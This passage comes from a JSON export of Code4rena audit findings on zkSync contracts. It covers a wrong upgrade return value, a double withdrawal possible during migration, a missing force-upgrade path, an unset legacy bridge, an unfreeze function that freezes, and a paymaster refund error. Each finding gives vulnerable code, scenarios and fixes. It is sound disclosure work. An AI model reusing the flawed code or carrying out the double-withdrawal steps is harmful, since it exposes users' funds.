{\ntxHash = bytes32(abi.encodePacked(_proposedUpgrade));\n }\n}\n\ncontract BaseContractGenesis is BaseContract {\n\n\n    function upgrade(bytes memory _proposedUpgrade) public override pure returns (bytes32) {\n\n        bytes32 txHash = bytes32(abi.encodePacked(_proposedUpgrade));\n\n    }\n}\n\n```\n\nPassing the value: `0x212226`.\n\nWe can see that:\n\n- `BaseContract.upgrade()` returns `0: bytes32: txHash 0x2122260000000000000000000000000000000000000000000000000000000000`, &\n- `BaseContractGenesis.upgrade()` returns `0: bytes32: txHash 0x0000000000000000000000000000000000000000000000000000000000000000`\n\nAnd this happens despite both functions having the same implementation.\n\n### Impact\n\nBorderline low/medium, cause whereas genesis upgrades do not work as expected, we can't seem to find a direct instance where the expected hash being returned is implemented in protocol.\n\n### Recommended Mitigation Steps\n\nName the variable to be returned as is done in [BaseZkSyncUpgrade.upgrade()`](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L67) or attach the `return` at the end of the function's execution, i.e apply these changes to: https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgradeGenesis.sol#L46-L68\n\n```diff\n\n-    function upgrade(ProposedUpgrade calldata _proposedUpgrade) public virtual override returns (bytes32) {\n+    function upgrade(ProposedUpgrade calldata _proposedUpgrade) public virtual override returns (bytes32 txHash) {\n        // Note that due to commitment delay, the timestamp of the L2 upgrade batch may be earlier than the timestamp\n        // of the L1 block at which the upgrade occurred. This means that using timestamp as a signifier of \"upgraded\"\n        // on the L2 side would be inaccurate. The effects of this \"back-dating\" of L2 upgrade batches will be reduced\n        // as the permitted delay window is reduced in the future.\n        require(block.timestamp >= _proposedUpgrade.upgradeTimestamp, \"Upgrade is not ready yet\");\n\n        _setNewProtocolVersion(_proposedUpgrade.newProtocolVersion);\n        _upgradeL1Contract(_proposedUpgrade.l1ContractsUpgradeCalldata);\n        _upgradeVerifier(_proposedUpgrade.verifier, _proposedUpgrade.verifierParams);\n        _setBaseSystemContracts(_proposedUpgrade.bootloaderHash, _proposedUpgrade.defaultAccountHash);\n\n        bytes32 txHash = _setL2SystemContractUpgrade(\n            _proposedUpgrade.l2ProtocolUpgradeTx,\n            _proposedUpgrade.factoryDeps,\n            _proposedUpgrade.newProtocolVersion\n        );\n\n        _postUpgrade(_proposedUpgrade.postUpgradeCalldata);\n\n        emit UpgradeComplete(_proposedUpgrade.newProtocolVersion, txHash, _proposedUpgrade);\n    }\n```\n\n**Additional Note**\n\n> Depending on the judge's stance of either looking at this as \"breaking core functionality\" or \"ignorable miss in `code/docs`\" determines the final valididty as we assume the former puts this report on the grounds of a `medium`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33192",
      "title": "[M-04] User might be able to double withdraw during migration",
      "impact": "MEDIUM",
      "content": "\n### Impact\n\nA user might be able to double withdraw during migration in some edge conditions: (1) if their withdrawal tx is included in a batch number the same or after `eraFirstPostUpgradeBatch`; (2)And if the user `finalizeWithdrawal` on the old L1ERC20Bridge.sol before L1ERC20Bridge.sol is upgraded.\n\n### Proof of Concept\n\nThe current migration process takes place in [steps](https://github.com/code-423n4/2024-03-zksync/blob/main/docs/Protocol%20Section/Migration%20process.md), which might allow edge conditions to occur. StepA: deploy new contracts(including L1SharedBridge); StepB:Era upgrade and L2 system contracts upgrade(at this point old L1ERC20Bridge still works); StepC: Upgrade L2 bridge and L1ERC20Brdige.sol. Then migrate funds to the new L1sharedBridge.\n\nSince L1ERC20Bridge.sol is upgraded at the end. An edge condition can occur between StepA and StepB, where a user can still withdraw ERC20 tokens on the old L1ERC20Brdige.sol.\n\nScenario: If a user `finalizeWithdrawal` ERC20 tokens on the old L1ERC20Bridge.sol first, they can withdraw again on L1SharedBridge.sol as long as the `_l2batchNumber` of the withdraw tx equals or is greater than `eraFirstPostUpgradeBatch`. In other words, `_isEraLegacyWithdrawal` check can be invalidated.\n\n1.  stepA: L1SharedBridge.sol will be deployed and initialized with a pre-determined value `eraFirstPostUpgradeBatch`;\n2.  UserA can initiate an ERC20 withdrawal tx on L2 bridge(currently old version);\n3.  stepB: Era upgrade is performed. UserA's withdrawal tx is included in the same `eraFirstPostUpgradeBatch` number;\n4.  UserA `finializeWithdrawal` on the old L1ERC20Brdige.sol.UserA should receive funds because funds haven't been migrated yet;\n5.  stepC: new L1ERC20Bridge.sol is upgraded and funds(ERC20) are migrated to L1SharedBridge.sol;\n6.  UserA `finializeWithdrawal` on L1SharedBridge.sol. This time, `_isEraLegacyWithdrawal(_chainId, _l2BatchNumber)` check will be bypassed,because user's `_l2BatchNumber` == `eraFirstPostUpgradeBatch`; UserA can receive the withdrawal funds a second time;\n\n```solidity\n//code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol\n    function finalizeWithdrawal(\n        uint256 _chainId,\n        uint256 _l2BatchNumber,\n        uint256 _l2MessageIndex,\n        uint16 _l2TxNumberInBatch,\n        bytes calldata _message,\n        bytes32[] calldata _merkleProof\n    ) external override {\n       //@audit-info when _l2BatchNumber>= eraFirstPostUpgradeBatch, `_isEraLegacyWithdrawal()` return false, checking on withdrawal status on legacyERC20bridge will be bypassed.\n|>     if (_isEraLegacyWithdrawal(_chainId, _l2BatchNumber)) {\n            require(\n                !legacyBridge.isWithdrawalFinalized(\n                    _l2BatchNumber,\n                    _l2MessageIndex\n                ),\n                \"ShB: legacy withdrawal\"\n            );\n        }\n        _finalizeWithdrawal(\n            _chainId,\n            _l2BatchNumber,\n            _l2MessageIndex,\n            _l2TxNumberInBatch,\n            _message,\n            _merkleProof\n        );\n}\n```\n\n(<https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L421-L427>)\n\n```solidity\n//code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol\n    function _isEraLegacyWithdrawal(\n        uint256 _chainId,\n        uint256 _l2BatchNumber\n    ) internal view returns (bool) {\n        return\n            (_chainId == ERA_CHAIN_ID) &&\n|>          (_l2BatchNumber < eraFirstPostUpgradeBatch); //@audit-info note:when _l2BatchNumber>= eraFirstPostUpgradeBatch, `_isEraLegacyWithdrawal()` return false.\n    }\n```\n\n(<https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L375>)\n\nAs seen, checking on legacyERC20bridge withdrawal status will only be performed when `_isEraLegacyWithdrawal` returns true. But due to `_l2BatchNumber` of a withdrawal tx during the upgrade can equal or be greater than a predefined `eraFirstPostUpgradeBatch`. `_isEraLegacyWithdrawal` check can be based on false assumptions on `_l2BatchNumber` and `eraFirstPostUpgradeBatch`, allowing double withdrawal on edge cases.\n\n### Recommended Mitigation Steps\n\nConsider adding a grace period during and following an upgrade, during which time legacyWithdrawal status will always be checked.\n\n**[razzorsec (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-03-zksync-findings/issues/34#issuecomment-2064245734):**\n > Realistically invalid, since we will not finalize the upgrade batch. But an interesting thing to remember, so we would consider this as Low, as it is mostly about managing the server.\n\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-03-zksync-findings/issues/34#issuecomment-2082849066):**\n > The Warden specifies that under certain circumstances, it is possible to perform a duplicate withdrawal when the system is in the midst of an upgrade.\n> \n> The Sponsor specifies that this issue is realistically invalid, however, the Sponsor's statement relies on being aware of the flaw and acting actively against it (i.e. not finalizing the upgrade batch) which I do not consider adequate justification to lower the severity of this exhibit.\n> \n> I believe a medium-risk grade is appropriate based on the fact that it illustrates a code flaw that will arise under operations permitted by the smart contracts which we cannot presume the Sponsor was aware of.\n\n***\n\n",
      "summary": "\nThis bug report discusses a potential issue in the code of the zkSync platform, which could allow users to withdraw funds twice during a system upgrade. This can happen if the user performs a withdrawal on the old version of the platform before it is upgraded, and then again on the upgraded version. This is due to a check in the code that can be bypassed in certain situations. The report suggests adding a grace period during and after an upgrade to prevent this issue. The severity of this bug is debated among the team, but it is recommended to be addressed to avoid any potential risks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "https://github.com/code-423n4/2024-03-zksync-findings/issues/34",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "33191",
      "title": "[M-03] State transition manager is unable to force upgrade a deployed ST, which invalidates the designed safeguard for 'urgent high risk situation'",
      "impact": "MEDIUM",
      "content": "\n### Impact\n\nState transition manager (STM) will be unable to force upgrade a deployed ST against intended design for 'urgent high risk situation'.\n\nThis invalidates the designed safeguard mechanism of an STM force upgrade and ST.\n\n### Proof of Concept\n\nAccording to [doc](https://github.com/code-423n4/2024-03-zksync/blob/main/docs/Smart%20contract%20Section/L1%20ecosystem%20contracts.md#configurability-in-the-first-release), `in case of urgent high risk situation, STM might force upgrade the contract`(ST).\n\nHowever, the above safeguard of force upgrading ST is not possible due to StateTransitionManger.sol's incomplete implementation.\n\n(1) A deployed chain(ST) can choose to perform a mandatory upgrade at its own convenience. It's also possible for an ST to postpone an upgrade set by the state transition manager. An ST will perform an upgrade through `upgradeChainFromVersion()` on the Admin facet.\n\n```solidity\n//code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol\n    function upgradeChainFromVersion(\n        uint256 _oldProtocolVersion,\n        Diamond.DiamondCutData calldata _diamondCut\n|>    ) external onlyAdminOrStateTransitionManager {\n...\n```\n\n(<https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L103>)\nNote that although `upgradeChainFromVersion()` is access-controlled by both chain admin and StateTransitionManager contract. StateTransitionManager will not be able to call it, because no methods or flows on StateTransitionManger.sol will invoke the call.\n\n(2) Another method on Admin facet for upgrade is `executeUpgrade()` which is access-controlled by only StateTransitionManager contract. However, `executeUpgrade()` can only be invoked inside `_setChainIdUpgrade()`. And `_setChainIdUpgrade()` can only be invoked inside `createNewChain()`. This means, after a chain(ST)'s genesis, `executeUpgrade()` cannot be invoked by stateTransitionManger again to perform further upgrades.\n\n```solidity\n//code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol\n    function executeUpgrade(\n        Diamond.DiamondCutData calldata _diamondCut\n|>    ) external onlyStateTransitionManager {\n        Diamond.diamondCut(_diamondCut);\n        emit ExecuteUpgrade(_diamondCut);\n    }\n```\n\n(<https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L123>)\n\n```solidity\n    function _setChainIdUpgrade(\n        uint256 _chainId,\n        address _chainContract\n    ) internal {\n...\n          //@audit executeUpgrade of an ST will only be called once at chain deployment, because _setChainIdUpgrade() is only invoked when creating a new chain.\n|>        IAdmin(_chainContract).executeUpgrade(cutData);\n...\n```\n\n(<https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol#L226>)\n\nAs a result of (1)&(2), StateChainManager cannot force upgrade an ST `in case of urgent high risk situation`. This invalidates the safeguard of force upgrade as stated by doc.\n\n### Recommended Mitigation Steps\n\nIn StateTransitionManager.sol, add a method that can call `executeUpgrade()` or `upgradeChainFromVersion()` on a local chain.\n\n**[saxenism (zkSync) confirmed and commented](https://github.com/code-423n4/2024-03-zksync-findings/issues/53#issuecomment-2036919937):**\n > Agree with the finding. Thank you :)\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-03-zksync-findings/issues/53#issuecomment-2082860557):**\n > The Warden has demonstrated how, in an urgent high-risk situation, a forced upgrade cannot be performed in contradiction with the project's documentation.\n> \n> Based on the fact that the vulnerability is correct and would surface in a low-likelihood scenario, a medium-risk assessment is appropriate.\n***\n\n",
      "summary": "\nThe bug report is about an issue with the State Transition Manager (STM) in the zkSync project. The STM is used to upgrade the Smart Contract (ST) in case of an urgent high-risk situation. However, the current implementation of the STM does not allow for this upgrade to be forced, which goes against the intended design and renders the safeguard mechanism useless. The report provides proof of concept and code snippets to explain the issue and recommends adding a new method to fix it. The developers have confirmed the finding and the judge has assessed it as a medium-risk vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "https://github.com/code-423n4/2024-03-zksync-findings/issues/53",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "33190",
      "title": "[M-02] L2SharedBridge l1LegacyBridge is not set",
      "impact": "MEDIUM",
      "content": "\nThe migration steps for `L1ERC20Bridge/L2ERC20Bridge` are as follows:\n\n<br><https://github.com/code-423n4/2024-03-zksync/blob/main/docs/Protocol%20Section/Migration%20process.md>\n\n> II. Upgrade L1ERC20Bridge contract\n>\n> 1.  Upgrade L2 bridge\n>\n> The new L2ERC20Bridge will upgraded to become the L2SharedBridge, and it will be backwards compatible with all messages from the old L1ERC20Bridge, so we upgrade that first as L1->L2 messages are much faster, and in the meantime we can upgrade the L1ERC20Bridge. The new L2SharedBridge can receive deposits from both the old L1ERC20Bridge and the new L1SharedBridge.\n>\n> 2.  Upgrade L1ERC20Bridge\n>\n> We upgrade the L1ERC20Bridge, and move all ERC20 tokens to the L1SharedBridge.\n\nSince `L2ERC20Bridge` will be updated first, and then `L1ERC20Bridge` will be updated, `L2SharedBridge` needs to be compatible with the old `L1ERC20Bridge` before `L1ERC20Bridge` is updated.\n\nSo in `L2SharedBridge.initialize()` we need to set `l1LegacyBridge = L1ERC20Bridge` and `finalizeDeposit()` to allow `l1LegacyBridge` to execute.\n\nBut the current implementation doesn't set `l1LegacyBridge`, it's always `address(0)`.\n\n```solidity\n    function initialize(\n        address _l1Bridge,\n        address _l1LegecyBridge,\n        bytes32 _l2TokenProxyBytecodeHash,\n        address _aliasedOwner\n    ) external reinitializer(2) {\n        require(_l1Bridge != address(0), \"bf\");\n        require(_l2TokenProxyBytecodeHash != bytes32(0), \"df\");\n        require(_aliasedOwner != address(0), \"sf\");\n        require(_l2TokenProxyBytecodeHash != bytes32(0), \"df\");\n\n        l1Bridge = _l1Bridge;\n        l2TokenProxyBytecodeHash = _l2TokenProxyBytecodeHash;\n\n        if (block.chainid != ERA_CHAIN_ID) {\n            address l2StandardToken = address(new L2StandardERC20{salt: bytes32(0)}());\n            l2TokenBeacon = new UpgradeableBeacon{salt: bytes32(0)}(l2StandardToken);\n            l2TokenBeacon.transferOwnership(_aliasedOwner);\n        } else {\n            require(_l1LegecyBridge != address(0), \"bf2\");\n@>          // Missing set l1LegecyBridge？\n            // l2StandardToken and l2TokenBeacon are already deployed on ERA, and stored in the proxy\n        }\n    }\n```\n\nThe above method just checks `_l1LegecyBridge ! = address(0)`, and does not assign a value, `l1LegacyBridge` is always `adddress(0)`.\n\nThis way any messages sent by the user before update `L1ERC20Bridge` will fail because `finalizeDeposit()` will not pass the validation\n\n### Impact\n\nUntil `L1ERC20Bridge` is updated, messages sent by the user will fail.\n\n### Recommended Mitigation\n\n```diff\n    function initialize(\n        address _l1Bridge,\n        address _l1LegecyBridge,\n        bytes32 _l2TokenProxyBytecodeHash,\n        address _aliasedOwner\n    ) external reinitializer(2) {\n...\n        if (block.chainid != ERA_CHAIN_ID) {\n            address l2StandardToken = address(new L2StandardERC20{salt: bytes32(0)}());\n            l2TokenBeacon = new UpgradeableBeacon{salt: bytes32(0)}(l2StandardToken);\n            l2TokenBeacon.transferOwnership(_aliasedOwner);\n        } else {\n            require(_l1LegecyBridge != address(0), \"bf2\");\n+           l1LegacyBridge = _l1LegecyBridge\n            // l2StandardToken and l2TokenBeacon are already deployed on ERA, and stored in the proxy\n        }\n    }\n```\n\n### Assessed type\n\nContext\n\n**[saxenism (zkSync) confirmed and commented](https://github.com/code-423n4/2024-03-zksync-findings/issues/77#issuecomment-2036960006):**\n > We confirm this finding. Thank you :)\n> \n> Just adding a little more context here:\n> \n> The deposits will fail but user can call claimFailedDeposit to get funds back.\n> We have failed to assign the l1LegacyBridge, but that does not pose a security risk since the l1Bridge should work as expected and therefore, the finalizeDeposit function still has a way to work. However, yes, this is an issue because this breaks our intended behaviour.\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-03-zksync-findings/issues/77#issuecomment-2082831324):**\n > The Warden has demonstrated how a missing assignment will result in legacy transactions failing to finalize. The impact is constrained to legacy transactions, and as it is possible for users to recover their failed deposits the impact is impermanent resulting in a severity of medium being appropriate.\n\n***\n\n",
      "summary": "\nThis bug report discusses a problem with the migration process for `L1ERC20Bridge/L2ERC20Bridge`. The report explains that the current implementation does not properly set the `l1LegacyBridge` variable in the `L2SharedBridge.initialize()` function, which can cause messages sent by users to fail until `L1ERC20Bridge` is updated. The impact of this bug is limited to legacy transactions and can be mitigated by assigning a value to `l1LegacyBridge` in the `initialize()` function. The severity of this bug is considered medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "https://github.com/code-423n4/2024-03-zksync-findings/issues/77",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "bin2chen"
      ]
    },
    {
      "id": "33189",
      "title": "[M-01] Freezed Chain will never be unfreeze since `StateTransitionManager::unfreezeChain` is calling `freezeDiamond` instead of `unfreezeDiamond`",
      "impact": "MEDIUM",
      "content": "\n`StateTransitionManager::unfreezeChain` function is meant for unfreeze the freezed chain of passed `_chainId` param. While `freezeChain` function is meant for freeze the chain according to passed \\_chainId. But `freezeChain` and `unfreezeChain` both functions are calling same function `freezeDiamond` by same line `IZkSyncStateTransition(stateTransition[_chainId]).freezeDiamond()` by mistake. So both these function will only freeze the chain.\n\nAlso there is no other function inside `StateTransitionManager.sol` contract which is calling `unfreezeDiamond`. `unfreezeDiamond` is function defined in `Admin.sol` where the call is going since `IZkSyncStateTransition` also inherits IAdmin which have freezeDiamond and unfreezeDiamond both functions. But `unfreezeDiamond` is not called from `unfreezeChain` function. So freezed chain will never be unfreeze.\n\n`unfreezeChain` also have wrong comment instead of writing unfreezes it writes freezes.\nIt seems like dev just copy pasted without doing required changes.\n\n### Vulnerable Code\n\n[code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol#L165-L167](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol#L165C4-L167C6)\n\n```solidity\n\n159:    /// @dev freezes the specified chain\n160:    function freezeChain(uint256 _chainId) external onlyOwner {\n161:        IZkSyncStateTransition(stateTransition[_chainId]).freezeDiamond();\n     }\n\n164:    /// @dev freezes the specified chain\n165:    function unfreezeChain(uint256 _chainId) external onlyOwner {\n166:        IZkSyncStateTransition(stateTransition[_chainId]).freezeDiamond();//@audit `freezeDiamond` called instead of `unfreezeDiamond`\n\n    }\n\n```\n\n(<https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-interfaces/IZkSyncStateTransition.sol#L15>)\n\n[IZkSyncStateTransition is inheriting IAdmin](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-interfaces/IZkSyncStateTransition.sol#L15) and by IZkSyncStateTransition wrapping instance is prepared to call freezeDiamond.\n\n```solidity\n15: interface IZkSyncStateTransition is IAdmin, IExecutor, IGetters, IMailbox {\n```\n\n[IAdmin interfaces have both functions](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-interfaces/IAdmin.sol#L52C5-L58C41)\n\n```solidity\n13:  interface IAdmin is IZkSyncStateTransitionBase {\n\n    ....\n\n52:  /// @notice Instantly pause the functionality of all freezable facets & their selectors\n     /// @dev Only the governance mechanism may freeze Diamond Proxy\n54:    function freezeDiamond() external;\n\n     /// @notice Unpause the functionality of all freezable facets & their selectors\n     /// @dev Both the admin and the STM can unfreeze Diamond Proxy\n58:    function unfreezeDiamond() external;\n\n```\n\nIt shows that by mistake unfreezeChain is calling freezeDiamond instaed of unfreezeDiamond which should be used to unfreeze the chain.\n\n### Impact\n\nFreezed chain will never be unfreeze.\nSince `freezeChain` and `unfreezeChain` both functions are calling same function `freezeDiamond` which is used to freeze the chain. And `unfreezeDiamond` no where called which should is made for unfreeze the freezed chain.\n\n### Recommended Mitigation\n\nIn `StateTransitionManager::unfreezeChain` function call `unfreezeDiamond` instead of `freezeDiamond` on `IZkSyncStateTransition(stateTransition[_chainId])` instance.\n\n```diff\nFile:  code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol\n- 164:    /// @dev freezes the specified chain\n+ 164:    /// @dev unfreezes the specified chain\n165:    function unfreezeChain(uint256 _chainId) external onlyOwner {\n- 166:        IZkSyncStateTransition(stateTransition[_chainId]).freezeDiamond();\n+ 166:        IZkSyncStateTransition(stateTransition[_chainId]).unfreezeDiamond();\n          }\n```\n\n**[0xsomeone (judge) increased severity to High](https://github.com/code-423n4/2024-03-zksync-findings/issues/97#issuecomment-2032589179)**\n\n**[saxenism (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-03-zksync-findings/issues/97#issuecomment-2036801296):**\n > This is a good finding, but we consider this a `medium` severity issue because in the current codebase `admin` could also unfreeze (so no permanent freeze & so not high), but in the future we might wanna change this mechanism.\n\n**[0xsomeone (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-zksync-findings/issues/97#issuecomment-2082815615):**\n > The submission and its relevant duplicates have identified a mistype in the codebase that causes certain functionality that is expected to be accessible to behave oppositely.\n> \n> The exhibit represents an actual error in the code resulting in functionality missing, however, the functionality does contain an alternative access path per the Sponsor's statement and as such I consider this exhibit to be of medium risk.\n\n\n\n***\n\n",
      "summary": "\nThe `StateTransitionManager::unfreezeChain` function is supposed to unfreeze a previously frozen chain, while the `freezeChain` function is meant to freeze a chain. However, both of these functions are mistakenly calling the `freezeDiamond` function instead of the `unfreezeDiamond` function. This means that both functions are only able to freeze the chain, but not unfreeze it. Additionally, the `unfreezeChain` function has a wrong comment stating that it freezes the chain instead of unfreezing it. This mistake was likely due to developers copying and pasting code without making the necessary changes. This bug affects the `StateTransitionManager.sol` contract and there is no other function within this contract that calls the correct `unfreezeDiamond` function. This means that the chain will remain frozen and cannot be unfrozen. The vulnerable code can be found in lines 165-167 of the `StateTransitionManager.sol` contract, where the `freezeDiamond` function is called instead of `unfreezeDiamond`. The impact of this bug is that the frozen chain will never be unfrozen. To fix this issue, the `unfreezeChain` function needs to call the `unfreezeDiamond` function instead of `freezeDiamond` on the `IZkSyncStateTransition` instance. The severity of this bug was originally marked as high, but was later downgraded to medium by the judge, as there is an alternative access path for unfreezing the chain through the `admin` function. However, this still represents an actual error in the code and should be addressed. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "https://github.com/code-423n4/2024-03-zksync-findings/issues/97",
      "tags": [],
      "finders": [
        "zhanmingjing",
        "forgebyola",
        "oakcobalt",
        "XDZIBECX",
        "bctester",
        "Dup1337",
        "bin2chen",
        "yashar",
        "0x11singh99",
        "rvierdiiev",
        "Bauchibred",
        "erebus",
        "Topmark"
      ]
    },
    {
      "id": "33188",
      "title": "[H-01] `paymaster` will refund `spentOnPubdata` to user",
      "impact": "HIGH",
      "content": "\nA very important modification of this update is that the GAS spent by `pubdata` is collected at the final step of the transaction.\n\nBut if there is a `paymaster`, when executing `paymaster.postTransaction(_maxRefundedGas)`,\n`_maxRefundedGas` does not subtract the `spentOnPubdata`.\n\n`bootloader.yul` the code is as follow：\n\n<details>\n\n```yul\n            function refundCurrentL2Transaction(\n                txDataOffset,\n                transactionIndex,\n                success, \n                gasLeft,\n                gasPrice,\n                reservedGas,\n                basePubdataSpent,\n                gasPerPubdata\n            ) -> finalRefund {\n                setTxOrigin(BOOTLOADER_FORMAL_ADDR())\n\n                finalRefund := 0\n\n                let innerTxDataOffset := add(txDataOffset, 32)\n\n                let paymaster := getPaymaster(innerTxDataOffset)\n                let refundRecipient := 0\n                switch paymaster\n                case 0 {\n                    // No paymaster means that the sender should receive the refund\n                    refundRecipient := getFrom(innerTxDataOffset)\n                }\n                default {\n                    refundRecipient := paymaster\n                    \n                    if gt(gasLeft, 0) {\n                        checkEnoughGas(gasLeft)\n                        let nearCallAbi := getNearCallABI(gasLeft)\n                        let gasBeforePostOp := gas()\n                        pop(ZKSYNC_NEAR_CALL_callPostOp(\n                            // Maximum number of gas that the postOp could spend\n                            nearCallAbi,\n                            paymaster,\n                            txDataOffset,\n                            success,\n                            // Since the paymaster will be refunded with reservedGas,\n                            // it should know about it\n@>                          safeAdd(gasLeft, reservedGas, \"jkl\"),\n                            basePubdataSpent,\n                            reservedGas,\n                            gasPerPubdata\n                        ))\n                        let gasSpentByPostOp := sub(gasBeforePostOp, gas())\n\n                        gasLeft := saturatingSub(gasLeft, gasSpentByPostOp)\n                    } \n                }\n\n                // It was expected that before this point various `isNotEnoughGasForPubdata` methods would ensure that the user \n                // has enough funds for pubdata. Now, we just subtract the leftovers from the user.\n@>              let spentOnPubdata := getErgsSpentForPubdata(\n                    basePubdataSpent,\n                    gasPerPubdata\n                )\n\n                let totalRefund := saturatingSub(add(reservedGas, gasLeft), spentOnPubdata)\n\n                askOperatorForRefund(\n                    totalRefund,\n                    spentOnPubdata,\n                    gasPerPubdata\n                )\n\n                let operatorProvidedRefund := getOperatorRefundForTx(transactionIndex)\n\n                // If the operator provides the value that is lower than the one suggested for \n                // the bootloader, we will use the one calculated by the bootloader.\n                let refundInGas := max(operatorProvidedRefund, totalRefund)\n\n                // The operator cannot refund more than the gasLimit for the transaction\n                if gt(refundInGas, getGasLimit(innerTxDataOffset)) {\n                    assertionError(\"refundInGas > gasLimit\")\n                }\n\n                if iszero(validateUint32(refundInGas)) {\n                    assertionError(\"refundInGas is not uint32\")\n                }\n\n                let ethToRefund := safeMul(\n                    refundInGas, \n                    gasPrice, \n                    \"fdf\"\n                ) \n\n                directETHTransfer(ethToRefund, refundRecipient)\n\n                finalRefund := refundInGas\n            }\n```\n\n</details>\n\n`paymaster's` `_maxRefundedGas = gasLeft + reservedGas`, without subtracting `spentOnPubdata`.\n\nThis way `_maxRefundedGas` will be much larger than the correct value.\n\n`paymaster` will refund the used `spentOnPubdata` to the user.\n\n### Impact\n\n`paymaster` will refund the `spentOnPubdata` already used by the user.\n\n### Recommended Mitigation\n\n<details>\n\n```diff\n            function refundCurrentL2Transaction(\n                txDataOffset,\n                transactionIndex,\n                success, \n                gasLeft,\n                gasPrice,\n                reservedGas,\n                basePubdataSpent,\n                gasPerPubdata\n            ) -> finalRefund {\n                setTxOrigin(BOOTLOADER_FORMAL_ADDR())\n\n                finalRefund := 0\n\n                let innerTxDataOffset := add(txDataOffset, 32)\n\n                let paymaster := getPaymaster(innerTxDataOffset)\n                let refundRecipient := 0\n                switch paymaster\n                case 0 {\n                    // No paymaster means that the sender should receive the refund\n                    refundRecipient := getFrom(innerTxDataOffset)\n                }\n                default {\n                    refundRecipient := paymaster\n+                   let expectSpentOnPubdata := getErgsSpentForPubdata(\n+                        basePubdataSpent,\n+                        gasPerPubdata\n+                    )                    \n                    if gt(gasLeft, 0) {\n                        checkEnoughGas(gasLeft)\n                        let nearCallAbi := getNearCallABI(gasLeft)\n                        let gasBeforePostOp := gas()\n                        pop(ZKSYNC_NEAR_CALL_callPostOp(\n                            // Maximum number of gas that the postOp could spend\n                            nearCallAbi,\n                            paymaster,\n                            txDataOffset,\n                            success,\n                            // Since the paymaster will be refunded with reservedGas,\n                            // it should know about it\n-                           safeAdd(gasLeft, reservedGas, \"jkl\"),\n+                           saturatingSub(add(reservedGas, gasLeft), expectSpentOnPubdata),\n                            basePubdataSpent,\n                            reservedGas,\n                            gasPerPubdata\n                        ))\n                        let gasSpentByPostOp := sub(gasBeforePostOp, gas())\n\n                        gasLeft := saturatingSub(gasLeft, gasSpentByPostOp)\n                    } \n                }\n\n                // It was expected that before this point various `isNotEnoughGasForPubdata` methods would ensure that the user \n                // has enough funds for pubdata. Now, we just subtract the leftovers from the user.\n                let spentOnPubdata := getErgsSpentForPubdata(\n                    basePubdataSpent,\n                    gasPerPubdata\n                )\n\n                let totalRefund := saturatingSub(add(reservedGas, gasLeft), spentOnPubdata)\n\n                askOperatorForRefund(\n                    totalRefund,\n                    spentOnPubdata,\n                    gasPerPubdata\n                )\n\n                let operatorProvidedRefund := getOperatorRefundForTx(transactionIndex)\n\n                // If the operator provides the value that is lower than the one suggested for \n                // the bootloader, we will use the one calculated by the bootloader.\n                let refundInGas := max(operatorProvidedRefund, totalRefund)\n\n                // The operator cannot refund more than the gasLimit for the transaction\n                if gt(refundInGas, getGasLimit(innerTxDataOffset)) {\n                    assertionError(\"refundInGas > gasLimit\")\n                }\n\n                if iszero(validateUint32(refundInGas)) {\n                    assertionError(\"refundInGas is not uint32\")\n                }\n\n                let ethToRefund := safeMul(\n                    refundInGas, \n                  